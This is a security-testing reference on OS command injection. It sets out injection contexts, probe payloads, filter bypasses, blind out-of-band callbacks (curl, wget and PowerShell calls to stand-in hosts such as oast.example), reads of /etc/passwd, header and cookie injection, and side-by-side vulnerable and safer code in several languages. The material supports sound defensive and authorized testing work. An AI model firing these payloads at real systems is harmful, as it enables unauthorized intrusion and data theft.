# Command Injection

## Introduction

Command Injection, also called **OS Command Injection** or **Shell Injection**, is a vulnerability where user-controlled input is passed into an operating system command in an unsafe way.

The key idea:

```text
User input  →  application builds OS command  →  shell interprets attacker-controlled syntax
```

This is dangerous because the injected command usually runs with the same privileges as the vulnerable application process.

Command injection can lead to:

* command execution on the server
* remote code execution
* sensitive file disclosure
* environment variable disclosure
* source code disclosure
* credential theft
* internal network reconnaissance
* cloud metadata access
* persistence through scheduled tasks or modified files
* lateral movement from the compromised host
* full application and server compromise

---

## Useful Resources

* [HackTricks Command Injection](https://hacktricks.wiki/en/pentesting-web/command-injection.html)
* [Incendium Command Injection Notes](https://notes.incendium.rocks/pentesting-notes/web/injection/command-injection)
* [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
* [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
* [OWASP WSTG Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
* [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
* [PayloadsAllTheThings Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
* [Commix](https://github.com/commixproject/commix)
* [Interactsh](https://github.com/projectdiscovery/interactsh)

---

## Basics

Most command injection testing is about answering six questions:

1. **Is user input used inside an OS command?**
   Example: ping, traceroute, nslookup, image conversion, backup, archive extraction, PDF generation, file search, git, curl, wget, ffmpeg, tar, zip.

2. **Is the command executed through a shell?**
   Shell execution is usually more dangerous because characters such as `;`, `&`, `|`, `$()`, and backticks may be interpreted.

3. **Can I break out of the intended argument?**
   Example: terminate quotes, inject command separator, comment out the rest.

4. **Can I see command output?**
   If yes, it is verbose/in-band command injection.

5. **If I cannot see output, can I prove execution indirectly?**
   Use time delays, DNS callbacks, HTTP callbacks, or output redirection in controlled lab/scope.

6. **Is this shell command injection or argument injection?**
   Even without shell metacharacters, attacker-controlled input may become dangerous command-line options.

A vulnerable flow often looks like this:

```text
User submits:
    host=127.0.0.1

Application builds:
    ping -c 4 127.0.0.1

Attacker submits:
    host=127.0.0.1; id

Application builds:
    ping -c 4 127.0.0.1; id

Shell executes:
    ping -c 4 127.0.0.1
    id
```

---

## Command Injection vs Argument Injection

| Type                               | Meaning                                                              | Example                                             |
| ---------------------------------- | -------------------------------------------------------------------- | --------------------------------------------------- |
| Command injection                  | Attacker injects a new OS command.                                   | `127.0.0.1; id`                                     |
| Argument injection                 | Attacker injects extra arguments/options into the intended command.  | `--help`, `-o output.txt`, `--config attacker.conf` |
| Code injection                     | Attacker injects code into a language runtime.                       | PHP, Python, JavaScript, Java                       |
| Template injection                 | Attacker injects template syntax that may lead to command execution. | SSTI                                                |
| SQL injection to command execution | SQLi is used to execute OS commands through database features.       | `xp_cmdshell`, UDFs, COPY PROGRAM                   |

Important:

```text
Not all command execution bugs need shell metacharacters.
Argument injection can still be serious even if ; & | $() are blocked.
```

---

## Main Command Injection Types

| Type                                 | Meaning                                                       | Typical signal                                              |
| ------------------------------------ | ------------------------------------------------------------- | ----------------------------------------------------------- |
| Verbose / in-band command injection  | Command output appears in the HTTP response.                  | `uid=`, `root`, `www-data`, `Windows IP Configuration`.     |
| Blind command injection              | Command executes but output is not returned.                  | Time delay, DNS callback, HTTP callback.                    |
| Semi-blind command injection         | No output, but response timing/status/error changes.          | Delay, different status, different length.                  |
| Error-based command injection        | Error messages expose shell behavior.                         | `command not found`, syntax error, unexpected token.        |
| Time-based command injection         | Injected command causes measurable delay.                     | `sleep`, `ping`, `timeout`.                                 |
| Out-of-band command injection        | Injected command calls attacker-controlled DNS/HTTP endpoint. | OAST callback.                                              |
| Output redirection command injection | Output is written to a file that can later be retrieved.      | `/static/ci.txt` appears.                                   |
| Argument injection                   | Input is treated as command-line option.                      | `--help`, `--version`, `-c`, `-o`.                          |
| Second-order command injection       | Payload is stored first and executed later.                   | Scheduled jobs, exports, admin reviews, background workers. |

---

## Where to Test

Test any functionality that may call operating system tools.

| Feature                 | Common backend command                       |
| ----------------------- | -------------------------------------------- |
| Ping tool               | `ping`                                       |
| Traceroute tool         | `traceroute`, `tracert`                      |
| DNS lookup              | `nslookup`, `dig`, `host`                    |
| WHOIS lookup            | `whois`                                      |
| File search             | `grep`, `find`                               |
| Archive handling        | `tar`, `zip`, `unzip`, `7z`                  |
| Image processing        | `convert`, `magick`, `exiftool`              |
| Video/audio processing  | `ffmpeg`                                     |
| PDF generation          | `wkhtmltopdf`, headless Chrome, LibreOffice  |
| Backup/export           | `tar`, `mysqldump`, `pg_dump`, shell scripts |
| Git import              | `git clone`, `git archive`, `git ls-remote`  |
| URL fetch/import        | `curl`, `wget`                               |
| Print/report generation | shell scripts, Java wrappers                 |
| Admin diagnostics       | ping, logs, service status                   |
| Device/router web UI    | ping, traceroute, nslookup, tcpdump          |
| CI/CD systems           | shell steps, build commands                  |
| Webhooks/integrations   | curl, script runners                         |
| Queue/background jobs   | worker scripts                               |
| File conversion         | office converters, media tools               |
| Template preview        | shell-based renderers                        |
| XML/SVG processing      | external tools or converters                 |

High-value parameter names:

```text
cmd
exec
command
execute
run
shell
ping
host
hostname
ip
domain
lookup
query
dns
url
uri
path
file
filename
folder
dir
directory
search
keyword
pattern
grep
backup
archive
download
upload
convert
image
pdf
template
script
process
service
debug
diagnostic
tool
option
arg
argument
target
address
callback
webhook
```

Interesting routes:

```text
/ping
/traceroute
/nslookup
/whois
/diagnostics
/admin/tools
/admin/debug
/admin/backup
/export
/import
/convert
/image/resize
/pdf/generate
/report
/webhook/test
/git/import
/api/debug
/api/diagnostics
/cgi-bin/*
```

---

## Dangerous Functions and APIs

Command injection often appears when applications use shell-execution APIs.

| Language | Risky functions / APIs                                                      |
| -------- | --------------------------------------------------------------------------- |
| PHP      | `system`, `exec`, `shell_exec`, `passthru`, `proc_open`, `popen`, backticks |
| Python   | `os.system`, `os.popen`, `subprocess.*` with `shell=True`                   |
| Node.js  | `child_process.exec`, `execSync`, `spawn` with `shell: true`                |
| Ruby     | `system`, `exec`, backticks, `%x{}`, `Open3` with shell strings             |
| Java     | `Runtime.exec`, `ProcessBuilder` when used with shell strings               |
| .NET     | `Process.Start`, `ProcessStartInfo` with shell interpreters                 |
| Go       | `exec.Command("sh", "-c", userInput)`                                       |
| Perl     | `system`, `exec`, backticks, `open` with pipes                              |
| Bash/CGI | direct interpolation of request parameters                                  |

Dangerous pattern:

```php
<?php
$host = $_GET["host"];
system("ping -c 4 " . $host);
?>
```

Safer pattern:

```php
<?php
$host = $_GET["host"];

if (!filter_var($host, FILTER_VALIDATE_IP)) {
    die("Invalid IP");
}

$cmd = ["/bin/ping", "-c", "4", "--", $host];
// Use a process API that passes arguments as an array and avoids the shell.
?>
```

---

## Safe Testing Workflow

1. Confirm scope and authorization.
2. Identify functionality likely to call OS commands.
3. Capture a normal request and response.
4. Change one parameter at a time.
5. Start with harmless markers:

```text
ci-test-73921
```

6. Try in-band proof first:

```text
; echo ci-test-73921
```

7. If no output appears, try time-based proof:

```text
; sleep 5
```

8. If timing is unreliable, try OAST/DNS proof:

```text
; nslookup ci-test-73921.oast.example
```

9. Test Linux and Windows syntax separately.
10. Avoid destructive commands.
11. Do not run broad internal scans.
12. Do not attempt persistence or reverse shells unless explicitly authorized.
13. Prove impact with the minimum safe evidence.

Good low-impact proof commands:

```text
id
whoami
hostname
uname -a
ver
echo ci-test-73921
pwd
date
```

Avoid as first proof:

```text
rm
del
format
shutdown
reboot
useradd
net user /add
chmod 777
curl | sh
wget | sh
reverse shell payloads
credential dumping
large scans
fork bombs
```

---

## Shell Metacharacters

Common command separators and shell metacharacters:

| Character   | Meaning                                                              |                                           |                                         |
| ----------- | -------------------------------------------------------------------- | ----------------------------------------- | --------------------------------------- |
| `;`         | Run commands sequentially on Unix-like shells.                       |                                           |                                         |
| `&`         | Run command in background on Unix; command separator on Windows CMD. |                                           |                                         |
| `&&`        | Run second command only if first succeeds.                           |                                           |                                         |
| `           |                                                                      | `                                         | Run second command only if first fails. |
| `           | `                                                                    | Pipe output of first command into second. |                                         |
| `` `cmd` `` | Command substitution on Unix-like shells.                            |                                           |                                         |
| `$(cmd)`    | Command substitution on Unix-like shells.                            |                                           |                                         |
| `%0a`       | URL-encoded newline.                                                 |                                           |                                         |
| `%0d%0a`    | URL-encoded CRLF.                                                    |                                           |                                         |
| `>`         | Redirect output to file.                                             |                                           |                                         |
| `>>`        | Append output to file.                                               |                                           |                                         |
| `<`         | Read input from file.                                                |                                           |                                         |
| `2>&1`      | Redirect stderr to stdout.                                           |                                           |                                         |
| `#`         | Comment rest of line in many Unix shell contexts.                    |                                           |                                         |
| `::`        | Comment style in Windows batch files.                                |                                           |                                         |
| `REM`       | Comment in Windows CMD/batch.                                        |                                           |                                         |

Both Unix and Windows commonly support:

```text
&
&&
|
||
```

Unix-specific common operators:

```text
;
%0a
`
$()
#
```

Windows-specific common operators:

```text
&
&&
|
||
%
^
,
```

---

## First Probe Payloads

Use a unique marker to avoid false positives.

### Generic

```text
; echo ci-test-73921
&& echo ci-test-73921
|| echo ci-test-73921
| echo ci-test-73921
& echo ci-test-73921
%0a echo ci-test-73921
```

### Linux / Unix

```text
; id
; whoami
; hostname
; uname -a
; pwd
; echo ci-test-73921
`id`
$(id)
%0aid
```

### Windows

```text
& whoami
& hostname
& ver
& echo ci-test-73921
&& whoami
| whoami
```

### Inside existing input

If the original feature expects an IP or hostname:

```text
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 || id
127.0.0.1 & whoami
127.0.0.1%0aid
```

If the original value is wrapped in quotes:

```text
"; id; #
' ; id; #
"; whoami; #
' && whoami && '
```

If the original command continues after your input, terminate the rest:

```text
127.0.0.1; id #
127.0.0.1 && id #
127.0.0.1 | id #
```

---

## Response Analysis

When testing, compare more than visible output.

| Signal                                | Meaning                                        |
| ------------------------------------- | ---------------------------------------------- |
| Marker appears                        | In-band command execution likely confirmed.    |
| `uid=` appears                        | Linux/Unix `id` executed.                      |
| `root`, `www-data`, `apache`, `nginx` | Process user exposed.                          |
| `Windows IP Configuration`            | Windows command output exposed.                |
| `command not found`                   | Shell syntax reached.                          |
| `syntax error`                        | Input affected shell parsing.                  |
| Response delayed                      | Time-based command likely executed.            |
| DNS callback                          | Blind/OAST command execution likely confirmed. |
| HTTP callback                         | Blind/OAST command execution likely confirmed. |
| Different status code                 | Input changed command behavior.                |
| Different response length             | Output/error changed.                          |
| 500 error                             | Possible syntax break or command failure.      |

Do not rely only on HTTP `200 OK`. Confirm the state or output actually changed.

---

## Verbose Command Injection

Verbose command injection means the command output is returned in the response.

Example vulnerable request:

```http
POST /diagnostics/ping HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1
```

Injected request:

```http
POST /diagnostics/ping HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1;id
```

Possible response:

```text
PING 127.0.0.1 ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Useful proof commands:

```text
id
whoami
hostname
pwd
uname -a
ver
echo ci-test-73921
```

Safer proof pattern:

```text
127.0.0.1; echo ci-test-73921
```

---

## Blind Command Injection

Blind command injection means the command runs but output is not returned.

Detection methods:

```text
time delay
DNS callback
HTTP callback
output redirection
side effect in a safe test object
```

### Linux Time Delay

```text
; sleep 5
&& sleep 5
| sleep 5
` sleep 5 `
$(sleep 5)
%0asleep 5
```

Inside an IP field:

```text
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
```

### Windows Time Delay

```text
& timeout /T 5
& ping -n 6 127.0.0.1
&& ping -n 6 127.0.0.1
| ping -n 6 127.0.0.1
```

### Timing Tips

Use multiple measurements:

```text
baseline request
sleep 3
sleep 5
sleep 8
repeat baseline
```

Look for consistent delay, not a single slow response.

---

## Out-of-Band Command Injection

Use OAST when output is not visible.

Tools:

```text
Burp Collaborator
interactsh
Canarytokens
webhook.site
requestrepo
custom DNS/HTTP listener
```

### DNS Callback

Linux/Unix:

```text
; nslookup ci-test-73921.oast.example
; host ci-test-73921.oast.example
; ping -c 1 ci-test-73921.oast.example
```

Windows:

```text
& nslookup ci-test-73921.oast.example
& ping -n 1 ci-test-73921.oast.example
```

### HTTP Callback

Linux/Unix:

```text
; curl http://ci-test-73921.oast.example/
; wget -qO- http://ci-test-73921.oast.example/
```

Windows:

```text
& powershell -Command "Invoke-WebRequest http://ci-test-73921.oast.example/ -UseBasicParsing"
```

For public notes and safe reports, prefer a static marker callback first:

```text
ci-test-73921.oast.example
```

Avoid exfiltrating real secrets unless the rules of engagement explicitly allow it.

---

## Output Redirection

If output is not returned but the web root is writable, command output may be redirected to a file and fetched later.

Lab-only example:

```text
; echo ci-test-73921 > /tmp/ci-test.txt
```

If the web root is known and writable:

```text
; echo ci-test-73921 > /var/www/html/ci-test.txt
```

Then request:

```text
https://vulnerable.example/ci-test.txt
```

Safer use:

```text
echo ci-test marker only
```

Avoid writing web shells, cron jobs, SSH keys, or persistent files unless explicitly authorized.

---

## Context Breaking

The payload depends on where your input lands in the command.

### Unquoted Context

Original command:

```text
ping -c 4 USER_INPUT
```

Payload:

```text
127.0.0.1; id
```

Result:

```text
ping -c 4 127.0.0.1; id
```

### Single-Quoted Context

Original command:

```text
grep 'USER_INPUT' /var/log/app.log
```

Payload:

```text
test'; id; #
```

Result:

```text
grep 'test'; id; #' /var/log/app.log
```

### Double-Quoted Context

Original command:

```text
grep "USER_INPUT" /var/log/app.log
```

Payload:

```text
test"; id; #
```

Result:

```text
grep "test"; id; #" /var/log/app.log
```

### Command Substitution Inside Quotes

Double quotes may still allow command substitution in Unix shells:

```text
"$(id)"
"`id`"
```

Single quotes usually prevent shell expansion, unless the attacker can terminate them.

---

## Common Injection Points

### Query Parameter

```http
GET /ping?host=127.0.0.1;id HTTP/1.1
Host: vulnerable.example
```

### POST Body

```http
POST /ping HTTP/1.1
Host: vulnerable.example
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1;id
```

### JSON Body

```http
POST /api/diagnostics HTTP/1.1
Host: vulnerable.example
Content-Type: application/json

{
  "host": "127.0.0.1; id"
}
```

### Multipart Form

```http
POST /upload HTTP/1.1
Host: vulnerable.example
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="filename"

test.jpg;id
------x--
```

### Headers

```http
GET / HTTP/1.1
Host: vulnerable.example
User-Agent: ci-test; id
Referer: ci-test; id
X-Forwarded-For: 127.0.0.1; id
```

Headers are interesting when they are passed to logging, analytics, mail, shell scripts, or admin diagnostics.

### Cookies

```http
GET / HTTP/1.1
Host: vulnerable.example
Cookie: tracking=abc;id
```

Cookies are interesting when parsed by legacy CGI scripts or shell-based wrappers.

---

## Windows vs Linux Payloads

### Linux / Unix Useful Commands

```text
whoami
id
hostname
uname -a
pwd
date
env
printenv
ip addr
ifconfig
netstat -an
ps aux
ls -la
```

### Windows Useful Commands

```text
whoami
hostname
ver
cd
echo %USERNAME%
echo %COMPUTERNAME%
ipconfig /all
netstat -ano
tasklist
set
dir
```

### Cross-Platform-ish

```text
whoami
hostname
echo ci-test-73921
```

When unsure about the OS, start with:

```text
; whoami
& whoami
```

or:

```text
; echo ci-linux
& echo ci-windows
```

---

## Filter Bypasses

Filters often block obvious characters such as:

```text
;
&
|
space
/
\
$
`
(
)
'
"
```

The goal is to understand whether the filter is syntactic, blacklist-based, encoding-based, or context-specific.

---

## Whitespace Bypasses

If spaces are blocked, try tabs, newlines, or shell variables.

### URL-Encoded Tab

```text
cat%09/etc/passwd
id%09-a
```

### Newline

```text
127.0.0.1%0aid
```

### Internal Field Separator

```text
cat${IFS}/etc/passwd
ls${IFS}-la
echo${IFS}ci-test-73921
```

### Brace Expansion

```text
{echo,ci-test-73921}
{id,-a}
```

Use harmless commands first.

---

## Separator Bypasses

If `;` is blocked, try:

```text
&&
||
|
&
%0a
%0d%0a
```

Examples:

```text
127.0.0.1&&id
127.0.0.1||id
127.0.0.1|id
127.0.0.1%0aid
```

If spaces are also blocked:

```text
127.0.0.1%0aid
127.0.0.1&&id
127.0.0.1|id
127.0.0.1;echo${IFS}ci-test
```

---

## Quote Bypasses

If a command name is blocked by exact matching, split it with quotes.

```text
w'h'o'am'i
wh''oami
w"h"o"am"i
wh""oami
```

Examples:

```text
127.0.0.1;w'h'o'am'i
127.0.0.1;w"h"o"am"i
```

This depends on shell behavior and quoting context.

---

## Slash Bypasses

If `/` is blocked, sometimes it can be reconstructed from environment variables.

Linux examples:

```text
${HOME:0:1}
${PWD:0:1}
```

Example shape:

```text
cat${IFS}${HOME:0:1}etc${HOME:0:1}passwd
```

Use only in authorized environments and prefer harmless files or markers when possible.

---

## Command Name Bypasses

Split or alter command names:

```text
who$@ami
who$()ami
w\ho\am\i
wh``oami
```

Examples:

```text
127.0.0.1;who$@ami
127.0.0.1;who$()ami
```

Windows command and path names are often case-insensitive:

```text
wHoAmI
DiR
HoStNaMe
```

---

## Encoding Bypasses

URL encoding:

```text
%3b id
%26 whoami
%7c id
%0a id
%24%28id%29
%60id%60
```

Double encoding:

```text
%253b id
%2526 whoami
%250a id
```

Hex-style command construction may work in some shells:

```text
echo -e "\x63\x69\x2d\x74\x65\x73\x74"
```

Do not rely on encoding alone; always confirm how the server decodes input before execution.

---

## Comment and Truncation

If the original command continues after your input, comment out or neutralize the rest.

Unix:

```text
127.0.0.1; id #
127.0.0.1; id %23
```

Windows batch-style contexts:

```text
127.0.0.1 & whoami & rem
127.0.0.1 & whoami & ::
```

Null-byte style payloads are usually less useful in modern stacks, but still appear in older parsers:

```text
%00
```

---

## Argument Injection

Argument injection occurs when user input is passed as an argument to a command, even if shell metacharacters are blocked.

Example vulnerable pattern:

```text
curl USER_INPUT
```

Harmless tests:

```text
--help
--version
-I
-v
```

Example:

```text
url=--help
```

Another example:

```text
ping USER_INPUT
```

Payload:

```text
-c 1 127.0.0.1
```

Possible result:

```text
ping -c 4 -c 1 127.0.0.1
```

Why this matters:

```text
The attacker may not execute a new shell command,
but they may control how the intended binary behaves.
```

Dangerous argument injection areas:

```text
curl / wget
tar / zip / unzip / 7z
git
ssh / scp
rsync
find
tcpdump
ffmpeg
ImageMagick
exiftool
java
python
node
openssl
```

Safer implementation:

```text
use argument arrays
use allowlists
reject leading hyphen where not expected
use -- end-of-options before user-controlled operands
```

Example:

```text
curl -- "$url"
```

But `--` must be placed correctly and does not replace input validation.

---

## Command Injection in Node.js

Risky:

```javascript
const { exec } = require("child_process");

app.get("/ping", (req, res) => {
  const host = req.query.host;
  exec(`ping -c 4 ${host}`, (err, stdout) => {
    res.send(stdout);
  });
});
```

Safer:

```javascript
const { execFile } = require("child_process");

app.get("/ping", (req, res) => {
  const host = req.query.host;

  if (!/^[a-zA-Z0-9.-]{1,253}$/.test(host)) {
    return res.status(400).send("Invalid host");
  }

  execFile("/bin/ping", ["-c", "4", "--", host], (err, stdout) => {
    res.send(stdout);
  });
});
```

Key point:

```text
exec() uses a shell.
execFile() with an argument array avoids shell parsing.
```

---

## Command Injection in Python

Risky:

```python
import subprocess
from flask import request

host = request.args.get("host")
output = subprocess.check_output(f"ping -c 4 {host}", shell=True)
```

Safer:

```python
import re
import subprocess
from flask import request, abort

host = request.args.get("host", "")

if not re.fullmatch(r"[A-Za-z0-9.-]{1,253}", host):
    abort(400)

output = subprocess.check_output(
    ["/bin/ping", "-c", "4", "--", host],
    stderr=subprocess.STDOUT,
    timeout=10,
)
```

Key point:

```text
Avoid shell=True with user-controlled input.
Pass arguments as a list.
Validate input with a strict allowlist.
```

---

## Command Injection in PHP

Risky:

```php
<?php
$host = $_GET['host'];
echo shell_exec("ping -c 4 " . $host);
?>
```

Better:

```php
<?php
$host = $_GET['host'];

if (!preg_match('/^[A-Za-z0-9.-]{1,253}$/', $host)) {
    http_response_code(400);
    exit("Invalid host");
}

$cmd = ['/bin/ping', '-c', '4', '--', $host];
// Use a process library that avoids shell interpolation.
?>
```

Escaping functions are better than raw concatenation, but they should not be treated as the whole defense. Strong validation and avoiding shell invocation are preferred.

---

## Command Injection in Java

Risky:

```java
String host = request.getParameter("host");
Runtime.getRuntime().exec("sh -c ping -c 4 " + host);
```

Safer:

```java
String host = request.getParameter("host");

if (!host.matches("[A-Za-z0-9.-]{1,253}")) {
    throw new IllegalArgumentException("Invalid host");
}

ProcessBuilder pb = new ProcessBuilder("/bin/ping", "-c", "4", "--", host);
Process p = pb.start();
```

Avoid:

```text
sh -c
cmd.exe /c
string concatenation into shell commands
```

---

## Common Real-World Patterns

### Ping Diagnostic

```text
ping -c 4 <host>
```

Payloads:

```text
127.0.0.1;id
127.0.0.1&&id
127.0.0.1|id
127.0.0.1%0aid
```

### DNS Lookup

```text
nslookup <domain>
```

Payloads:

```text
example.com;id
example.com&&whoami
example.com%0aid
```

### File Search

```text
grep "<search>" /var/log/app.log
```

Payloads:

```text
test";id;#
test';id;#
$(id)
`id`
```

### Git Import

```text
git clone <repo>
```

Tests:

```text
--help
--version
https://example.com/repo.git;id
```

### Curl Fetcher

```text
curl <url>
```

Tests:

```text
--help
-I
https://example.com;id
```

### Archive Extraction

```text
tar -xf <filename>
```

Tests:

```text
--help
--version
test.tar;id
```

For argument injection testing, start with harmless flags such as `--help` or `--version`.

---

## Blind OAST Patterns

Use unique values for each parameter and endpoint.

```text
ci-host-73921.oast.example
ci-file-73921.oast.example
ci-json-73921.oast.example
ci-header-73921.oast.example
```

Linux:

```text
; nslookup ci-host-73921.oast.example
; curl http://ci-host-73921.oast.example/
```

Windows:

```text
& nslookup ci-host-73921.oast.example
& ping -n 1 ci-host-73921.oast.example
```

Check:

```text
DNS callback only      → command probably reached DNS-capable utility
HTTP callback          → command made outbound HTTP request
source IP              → server/NAT/cloud origin
User-Agent             → curl, wget, PowerShell, Java, Python, etc.
timestamp              → correlate with request
unique path            → identify vulnerable parameter
```

---

## Second-Order Command Injection

Second-order command injection happens when the payload is stored first and executed later.

Examples:

```text
profile display name used in report generator
filename used in backup script
uploaded archive name used in extraction command
Git URL stored and cloned by worker later
webhook name used in curl command
email address used in mail command
log field processed by shell script
admin-only diagnostic replays stored value
```

Testing approach:

```text
1. Store harmless marker payload.
2. Trigger the background job or wait for scheduled execution.
3. Monitor OAST listener.
4. Check logs or generated reports.
5. Keep payload unique per storage location.
```

Example marker:

```text
ci-second-order-73921
```

OAST-style marker:

```text
; nslookup ci-second-order-73921.oast.example
```

---

## Tools

### Burp Suite

Useful for:

```text
capturing requests
generating variations
Repeater testing
Intruder fuzzing
Collaborator/OAST callbacks
comparing timing
```

### Commix

Automated command injection testing tool.

Use carefully:

```text
commix -u "https://target.example/ping?host=127.0.0.1"
```

Good practice:

```text
use in lab or authorized scope only
rate-limit requests
review payloads before running
avoid destructive exploitation modes
```

### Interactsh

Useful for OAST confirmation.

```text
interactsh-client
```

Then use generated domain in payloads:

```text
; nslookup unique.interactsh-domain.example
```

### Custom Listener

Simple HTTP listener for lab testing:

```bash
python3 -m http.server 8000
```

Use with:

```text
; curl http://attacker-controlled-host:8000/ci-test
```

Only use infrastructure you control.

---

## Common False Positives

| Situation             | Why it can mislead                                         |
| --------------------- | ---------------------------------------------------------- |
| Reflected input       | The app echoes your payload without executing it.          |
| WAF block page        | Response changes because of WAF, not execution.            |
| Normal network delay  | Slow response mistaken for `sleep`.                        |
| DNS prefetch/proxy    | Callback caused by scanner/proxy, not target command.      |
| Validation error      | Syntax rejected before command execution.                  |
| Client-side execution | JavaScript changed page, not server command.               |
| Application feature   | Ping tool legitimately pings host but no injection exists. |
| Shell error only      | Input broke command but did not execute attacker command.  |
| Cached response       | Old output or CDN behavior.                                |

Confirm with at least two signals when possible:

```text
marker output + state change
time delay + repeated baseline
DNS callback + unique parameter
different operator + same result
```

---

## Impact Chaining

Command injection is often a starting point for deeper compromise.

Common chains:

```text
command injection → read application config
command injection → environment variable disclosure
command injection → database credential theft
command injection → cloud metadata access
command injection → internal network reconnaissance
command injection → source code disclosure
command injection → container escape attempt
command injection → CI/CD secret theft
command injection → lateral movement
command injection → full host compromise
```

Cloud/container things to check only in authorized environments:

```text
environment variables
mounted secrets
service account tokens
instance metadata reachability
container runtime socket exposure
Kubernetes service account files
CI/CD tokens
application config files
```

Avoid using discovered credentials unless scope explicitly allows it.

---


## Manual Command Injection Checklist

### Discovery

* [ ] Identified features that may call OS commands.
* [ ] Checked diagnostic tools such as ping, traceroute, nslookup, whois.
* [ ] Checked import/export, backup, archive, PDF, image, and media features.
* [ ] Checked admin/debug endpoints.
* [ ] Checked parameters, JSON fields, multipart fields, headers, and cookies.
* [ ] Checked background jobs and second-order execution paths.

### Basic Testing

* [ ] Used unique harmless marker.
* [ ] Tested `;`.
* [ ] Tested `&`.
* [ ] Tested `&&`.
* [ ] Tested `||`.
* [ ] Tested `|`.
* [ ] Tested newline `%0a`.
* [ ] Tested backticks.
* [ ] Tested `$()`.
* [ ] Tested quote breaking.
* [ ] Tested comment truncation.
* [ ] Confirmed actual execution, not reflection.

### Verbose Testing

* [ ] Tried `echo ci-test`.
* [ ] Tried `whoami`.
* [ ] Tried `id`.
* [ ] Tried `hostname`.
* [ ] Tried OS-specific commands.
* [ ] Compared status, length, output, and errors.

### Blind Testing

* [ ] Tested baseline timing.
* [ ] Tested `sleep` or `ping` delay.
* [ ] Repeated timing tests.
* [ ] Tested DNS callback.
* [ ] Tested HTTP callback.
* [ ] Used unique OAST domain per parameter.
* [ ] Avoided sensitive data exfiltration unless explicitly authorized.

### Bypass Testing

* [ ] Tested encoded separators.
* [ ] Tested no-space payloads.
* [ ] Tested `${IFS}`.
* [ ] Tested tabs.
* [ ] Tested newlines.
* [ ] Tested quote splitting.
* [ ] Tested command substitution.
* [ ] Tested comment characters.
* [ ] Tested Windows syntax.
* [ ] Tested Linux syntax.
* [ ] Tested argument injection with harmless flags.

### Argument Injection

* [ ] Identified downstream binary.
* [ ] Tested harmless options such as `--help` or `--version`.
* [ ] Checked if leading hyphen is accepted.
* [ ] Checked if `--` delimiter is used.
* [ ] Checked if user input controls output path, config path, URL, or script path.
* [ ] Assessed utility-specific dangerous flags.

### Impact

* [ ] Identified execution user.
* [ ] Identified operating system.
* [ ] Identified command context.
* [ ] Confirmed whether output is visible.
* [ ] Confirmed whether egress is possible.
* [ ] Checked privileges without destructive actions.
* [ ] Documented minimum safe proof.
* [ ] Avoided persistence and destructive commands.

---

## Quick Payload Bank

Generic markers:

```text
; echo ci-test-73921
&& echo ci-test-73921
|| echo ci-test-73921
| echo ci-test-73921
& echo ci-test-73921
%0aecho ci-test-73921
```

Linux / Unix:

```text
; id
; whoami
; hostname
; uname -a
; pwd
; sleep 5
`id`
$(id)
```

Windows:

```text
& whoami
& hostname
& ver
& echo ci-test-73921
& ping -n 6 127.0.0.1
```

IP-field payloads:

```text
127.0.0.1;id
127.0.0.1&&id
127.0.0.1||id
127.0.0.1|id
127.0.0.1&id
127.0.0.1%0aid
```

Quote breaking:

```text
";id;#
';id;#
"&&whoami&&"
'&&whoami&&'
```

Blind Linux:

```text
;sleep 5
&&sleep 5
|sleep 5
;nslookup ci-test-73921.oast.example
;curl http://ci-test-73921.oast.example/
```

Blind Windows:

```text
& ping -n 6 127.0.0.1
& nslookup ci-test-73921.oast.example
& powershell -Command "Invoke-WebRequest http://ci-test-73921.oast.example/ -UseBasicParsing"
```

No-space ideas:

```text
cat${IFS}/etc/passwd
echo${IFS}ci-test-73921
{id,-a}
who$@ami
who$()ami
```

Encoded:

```text
%3bid
%26whoami
%7cid
%0aid
%24%28id%29
%60id%60
```

Argument injection probes:

```text
--help
--version
-v
-I
-c 1 127.0.0.1
```

Header probes:

```http
User-Agent: ci-test; id
Referer: ci-test; id
X-Forwarded-For: 127.0.0.1; id
```